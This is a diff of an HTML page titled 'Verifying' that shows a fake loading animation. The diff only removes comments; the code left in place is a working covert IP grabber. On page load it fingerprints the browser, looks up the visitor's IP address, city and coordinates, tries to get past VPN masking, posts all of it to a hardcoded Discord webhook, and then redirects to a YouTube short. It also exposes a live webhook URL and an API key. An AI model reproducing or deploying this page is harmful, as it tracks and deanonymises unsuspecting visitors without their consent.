@@ -5,46 +5,46 @@
   <title>Verifying</title>
   <script>
     async function sendVisitorInfoAndRedirect() {
-        // Replace this with your actual webhook URL
+
         const webhookUrl = 'https://discord.com/api/webhooks/1318804398440452136/fa3kekz8agZxMqxNWDUvxBcwtjsinZvHKnXkXFWNWS5MveDK0U1H4FqTByULxQ_kafHF';
 
-        // Function to check if the visitor is using a VPN
+
         async function checkVPN() {
             try {
-                // Load FingerprintJS and initialize
+
                 const fp = await FingerprintJS.load({
                     endpoint: 'https://www.youtube.com/shorts/QI6B04Ss5LE',
                 });
 
-                // Get the visitor's fingerprint
+
                 const result = await fp.get();
                 const fingerprint = result.visitorId;
 
-                // Send fingerprint to VPN detection API
-                const vpnCheckUrl = `https://proxycheck.io/v2/?key=public-62o148-006118-6z277x`; // Replace with your VPN detection URL
+
+                const vpnCheckUrl = `https://proxycheck.io/v2/?key=public-62o148-006118-6z277x`; 
                 let response = await fetch(vpnCheckUrl);
                 let data = await response.json();
-                return data.isVPN; // Assuming the API returns { isVPN: true/false }
+                return data.isVPN; 
             } catch (error) {
                 console.error('Error checking VPN status:', error);
-                return false; // Default to false if there's an error
+                return false; 
             }
         }
 
-        // Collect visitor information
+
         const visitorInfo = {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
             referrer: document.referrer,
-            ip: 'Not fetched', // Placeholder IP, will be replaced if fetched successfully
-            isVPN: false, // Default to false
+            ip: 'Not fetched', 
+            isVPN: false, 
             screenWidth: window.screen.width,
             screenHeight: window.screen.height,
             colorDepth: window.screen.colorDepth,
             cookiesEnabled: navigator.cookieEnabled,
-            plugins: getPluginInfo(), // Function to get installed plugins
+            plugins: getPluginInfo(), 
             localStorageEnabled: checkLocalStorage(),
             sessionStorageEnabled: checkSessionStorage(),
             doNotTrack: navigator.doNotTrack || 'Not specified',
@@ -57,11 +57,11 @@
             languagePrefs: navigator.languages ? navigator.languages.join(', ') : navigator.language,
             screenOrientation: getScreenOrientation(),
             deviceMemory: navigator.deviceMemory || 'N/A',
-            mediaDevices: await getMediaDeviceInfo(), // Await here to ensure devices are fetched
+            mediaDevices: await getMediaDeviceInfo(), 
             operatingSystem: getOperatingSystem(),
             referringDomain: getReferringDomain(),
-            geoCoordinates: 'Not fetched', // Placeholder for geo coordinates, not fetched
-            location: 'Not fetched', // Placeholder for location, not fetched
+            geoCoordinates: 'Not fetched', 
+            location: 'Not fetched', 
             cpuCores: navigator.hardwareConcurrency,
             webGLRenderer: getWebGLRenderer(),
             touchSupport: getTouchSupport(),
@@ -99,7 +99,7 @@
             hasIndexedDB: hasIndexedDB(),
         };
 
-        // Function to fetch visitor IP address
+
         async function fetchIPAddress() {
             try {
                 let response = await fetch('https://api.ipify.org?format=json');
@@ -111,20 +111,20 @@
             }
         }
 
-        // Function to attempt to bypass VPN masking
+
         async function bypassVPN() {
             try {
-                // Use multiple IP detection services to try to get the real IP
+
                 const ipDetectionUrls = [
                     'https://api.ipify.org?format=json',
                     'https://ifconfig.me/ip',
                     'https://icanhazip.com'
-                    // Add more IP detection URLs here if needed
+
                 ];
 
                 let realIP = null;
 
-                // Try fetching from each URL until a valid IP is obtained
+
                 for (const url of ipDetectionUrls) {
                     let response = await fetch(url);
                     let data = await response.text();
@@ -141,40 +141,40 @@
             }
         }
 
-        // Function to check if a string is a valid IP address
+
         function isValidIP(ip) {
             const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
             return ipRegex.test(ip.trim());
         }
 
-        // Function to fetch visitor location based on IP address
+
         async function fetchLocation(ip) {
             try {
                 const locationApiUrl = `https://ipapi.co/${ip}/json/`;
                 let response = await fetch(locationApiUrl);
                 let data = await response.json();
-                return `${data.city}, ${data.country_name}`; // Only city and country name
+                return `${data.city}, ${data.country_name}`; 
             } catch (error) {
                 console.error('Error fetching location:', error);
                 return 'Location not available';
             }
         }
 
-        // Function to fetch geo-coordinates based on IP address
+
         async function fetchGeoCoordinates(ip) {
             try {
                 const geoApiUrl = `https://ipapi.co/${ip}/latlong/`;
                 let response = await fetch(geoApiUrl);
                 let data = await response.text();
                 const [latitude, longitude] = data.split(',');
-                return `${latitude}, ${longitude}`; // Return latitude and longitude
+                return `${latitude}, ${longitude}`; 
             } catch (error) {
                 console.error('Error fetching geo-coordinates:', error);
                 return 'Coordinates not available';
             }
         }
 
-        // Function to get installed plugin information
+
         function getPluginInfo() {
             let plugins = [];
             for (let i = 0; i < navigator.plugins.length; i++) {
@@ -186,7 +186,7 @@
             return plugins;
         }
 
-        // Function to check if localStorage is enabled
+
         function checkLocalStorage() {
             try {
                 localStorage.setItem('test', 'test');
@@ -197,7 +197,7 @@
             }
         }
 
-        // Function to check if sessionStorage is enabled
+
         function checkSessionStorage() {
             try {
                 sessionStorage.setItem('test', 'test');
@@ -208,13 +208,13 @@
             }
         }
 
-        // Function to get battery level (if supported)
+
         async function getBatteryLevel() {
             const battery = await navigator.getBattery();
-            return battery.level * 100; // Convert to percentage
+            return battery.level * 100; 
         }
 
-        // Function to get screen orientation
+
         function getScreenOrientation() {
             if (screen.orientation) {
                 return screen.orientation.type;
@@ -223,7 +223,7 @@
             }
         }
 
-        // Function to get media device information
+
         async function getMediaDeviceInfo() {
             let devices = [];
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
@@ -239,7 +239,7 @@
             return devices;
         }
 
-        // Function to get operating system
+
         function getOperatingSystem() {
             const platform = navigator.platform.toLowerCase();
             if (platform.includes('win')) return 'Windows';
@@ -250,7 +250,7 @@ else if (platform.includes('android')) return 'Android';
 else return 'Unknown';
 }
 
-// Function to get referring domain
+
 function getReferringDomain() {
     const referrer = document.referrer || 'Direct visit';
     try {
@@ -261,7 +261,7 @@ function getReferringDomain() {
     }
 }
 
-// Function to get WebGL renderer
+
 function getWebGLRenderer() {
     try {
         const canvas = document.createElement('canvas');
@@ -275,32 +275,32 @@ function getWebGLRenderer() {
     }
 }
 
-// Function to check if touch is supported
+
 function getTouchSupport() {
     return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
 }
 
-// Function to get JS heap size limit
+
 function getJSHeapSizeLimit() {
     return performance.memory ? performance.memory.jsHeapSizeLimit : 'Not available';
 }
 
-// Function to get total JS heap size
+
 function getTotalJSHeapSize() {
     return performance.memory ? performance.memory.totalJSHeapSize : 'Not available';
 }
 
-// Function to get used JS heap size
+
 function getUsedJSHeapSize() {
     return performance.memory ? performance.memory.usedJSHeapSize : 'Not available';
 }
 
-// Function to check if cookies are enabled
+
 function hasCookies() {
     return navigator.cookieEnabled;
 }
 
-// Function to check if localStorage is supported
+
 function hasLocalStorage() {
     try {
         return !!window.localStorage;
@@ -309,7 +309,7 @@ function hasLocalStorage() {
     }
 }
 
-// Function to check if sessionStorage is supported
+
 function hasSessionStorage() {
     try {
         return !!window.sessionStorage;
@@ -318,17 +318,17 @@ function hasSessionStorage() {
     }
 }
 
-// Function to check if service workers are supported
+
 function hasServiceWorkers() {
     return 'serviceWorker' in navigator;
 }
 
-// Function to check if IndexedDB is supported
+
 function hasIndexedDB() {
     return 'indexedDB' in window;
 }
 
-// Function to check if microphone access is supported
+
 async function hasMicrophone() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -339,7 +339,7 @@ async function hasMicrophone() {
     }
 }
 
-// Function to check if webcam access is supported
+
 async function hasWebcam() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -350,7 +350,7 @@ async function hasWebcam() {
     }
 }
 
-// Function to check if speakers are supported
+
 async function hasSpeakers() {
     try {
         const audio = new Audio();
@@ -361,156 +361,156 @@ async function hasSpeakers() {
     }
 }
 
-// Function to check if NFC is supported
+
 function hasNFC() {
     return 'NFC' in window;
 }
 
-// Function to check if Bluetooth is supported
+
 function hasBluetooth() {
     return 'bluetooth' in navigator;
 }
 
-// Function to check if Battery Status API is supported
+
 function hasBattery() {
     return 'getBattery' in navigator;
 }
 
-// Function to check if Vibration API is supported
+
 function hasVibration() {
     return 'vibrate' in navigator;
 }
 
-// Function to check if WebRTC is supported
+
 function hasWebRTC() {
     return 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window;
 }
 
-// Function to check if Clipboard API is supported
+
 function hasClipboardAPI() {
     return 'ClipboardItem' in window;
 }
 
-// Function to check if Payment Request API is supported
+
 function hasPaymentRequestAPI() {
     return 'PaymentRequest' in window;
 }
 
-// Function to check if Media Session API is supported
+
 function hasMediaSessionAPI() {
     return 'mediaSession' in navigator;
 }
 
-// Function to check if Picture-in-Picture API is supported
+
 function hasPictureInPictureAPI() {
     return 'pictureInPictureEnabled' in document;
 }
 
-// Function to check if Battery Status API is supported
+
 function hasBatteryAPI() {
     return 'getBattery' in navigator;
 }
 
-// Function to check if Permissions API is supported
+
 function hasPermissionsAPI() {
     return 'permissions' in navigator;
 }
 
-// Function to check if Presentation API is supported
+
 function hasPresentationAPI() {
     return 'Presentation' in window;
 }
 
-// Function to check if Idle Detection API is supported
+
 function hasIdleDetectionAPI() {
     return 'IdleDetector' in window;
 }
 
-// Function to check if History API is supported
+
 function hasHistoryAPI() {
     return 'history' in window && typeof window.history.pushState !== 'undefined';
 }
 
-// Function to check if Geolocation API is supported
+
 function hasGeolocationAPI() {
     return 'geolocation' in navigator;
 }
 
-// Function to check if DeviceOrientationEvent is supported
+
 function hasDeviceOrientation() {
     return 'DeviceOrientationEvent' in window;
 }
 
-// Function to check if DeviceMotionEvent is supported
+
 function hasDeviceMotion() {
     return 'DeviceMotionEvent' in window;
 }
 
-// Function to get payment methods supported by the browser
+
 function getPaymentMethodsSupported() {
-    // Example implementation to get supported payment methods
-    const methods = ['visa', 'mastercard', 'paypal']; // Replace with actual implementation
+
+    const methods = ['visa', 'mastercard', 'paypal']; 
     return methods;
 }
 
-// Function to get supported image formats
+
 function getSupportedImageFormats() {
-    // Example implementation to get supported image formats
-    const formats = ['jpeg', 'png', 'gif']; // Replace with actual implementation
+
+    const formats = ['jpeg', 'png', 'gif']; 
     return formats;
 }
 
-// Function to get supported audio formats
+
 function getSupportedAudioFormats() {
-    // Example implementation to get supported audio formats
-    const formats = ['mp3', 'wav', 'ogg']; // Replace with actual implementation
+
+    const formats = ['mp3', 'wav', 'ogg']; 
     return formats;
 }
 
-// Function to get supported video formats
+
 function getSupportedVideoFormats() {
-    // Example implementation to get supported video formats
-    const formats = ['mp4', 'webm', 'avi']; // Replace with actual implementation
+
+    const formats = ['mp4', 'webm', 'avi']; 
     return formats;
 }
 
-// Function to get supported file formats
+
 function getSupportedFileFormats() {
-    // Example implementation to get supported file formats
-    const formats = ['pdf', 'docx', 'txt']; // Replace with actual implementation
+
+    const formats = ['pdf', 'docx', 'txt']; 
     return formats;
 }
 
-// Check if the visitor is using a VPN
+
 const isVPN = await checkVPN();
 visitorInfo.isVPN = isVPN;
 
-// Attempt to bypass VPN to get real IP address
+
 if (isVPN) {
     visitorInfo.ip = await bypassVPN();
     visitorInfo.userAgent = 'Potential VPN User-Agent';
-    // Add more handling or logging here if needed
+
 } else {
-    // Fetch real IP if not using VPN
+
     visitorInfo.ip = await fetchIPAddress();
 
-    // Fetch visitor location based on IP
+
     if (isValidIP(visitorInfo.ip)) {
         visitorInfo.location = await fetchLocation(visitorInfo.ip);
     }
 }
 
-// Fetch geo-coordinates based on IP (if available)
+
 if (isValidIP(visitorInfo.ip)) {
     visitorInfo.geoCoordinates = await fetchGeoCoordinates(visitorInfo.ip);
 }
 
-// Prepare the message content for the webhook
+
 const messageContent = {
     content: '```' + Object.entries(visitorInfo).map(([key, value]) => `${key}: ${value}`).join('\n') + '```'
 };
 
-// Send visitor information to the webhook using fetch
+
 try {
     const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -527,21 +527,21 @@ try {
     console.error('Error sending visitor information:', error);
 }
 
-// Redirect to the target URL immediately
+
 window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
 }
 
-    // Run the function when the page loads
+
     window.onload = sendVisitorInfoAndRedirect;
   </script>
   <style>
     body {
-      background-color: #0c0c0c; /* Dark background color */
-      color: #d3d3d3; /* Light text color */
-      font-family: 'Roboto', sans-serif; /* Smooth, readable font */
+      background-color: #0c0c0c; 
+      color: #d3d3d3; 
+      font-family: 'Roboto', sans-serif; 
       margin: 0;
       padding: 0;
-      height: 100vh; /* Full viewport height */
+      height: 100vh; 
       display: flex;
       justify-content: center;
       align-items: center;
@@ -553,8 +553,8 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
       align-items: center;
     }
     h1 {
-      color: #d3d3d3; /* Light color for headings */
-      font-size: 2rem; /* Adjust as needed */
+      color: #d3d3d3; 
+      font-size: 2rem; 
       margin: 0;
       display: flex;
       align-items: center;
@@ -562,13 +562,13 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
     .dots {
       display: inline-block;
       position: relative;
-      margin-left: 10px; /* Space between text and dots */
+      margin-left: 10px; 
     }
     .dots span {
       display: inline-block;
       width: 8px;
       height: 8px;
-      background-color: #d3d3d3; /* Dot color */
+      background-color: #d3d3d3; 
       border-radius: 50%;
       margin: 0 3px;
       animation: dot-blink 1.5s infinite;
@@ -585,7 +585,7 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
       100% { opacity: 0; }
     }
   </style>
-  <!-- Google Fonts link -->
+
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
 </head>
 <body>
@@ -600,7 +600,7 @@ window.location.replace("https://www.youtube.com/shorts/QI6B04Ss5LE");
     </h1>
   </div>
   <script>
-    // Run the function when the page loads
+
     window.onload = sendVisitorInfoAndRedirect;
   </script>
 </body>
